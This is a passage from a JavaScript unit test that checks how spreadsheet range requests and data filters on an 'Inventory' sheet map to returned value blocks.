      ["Inventory!A1:B2", "Inventory!A1:B2", "Inventory!D1"],
      [{ dataFilters: [{ a1Range: "Inventory!A1:B2" }], valueRange: A }, { valueRange: { values: [["total"]] } }]
    );
    expect(blocks[1].values).toEqual(A.values);
    expect(blocks[2].values).toEqual([["total"]]);
  });
});
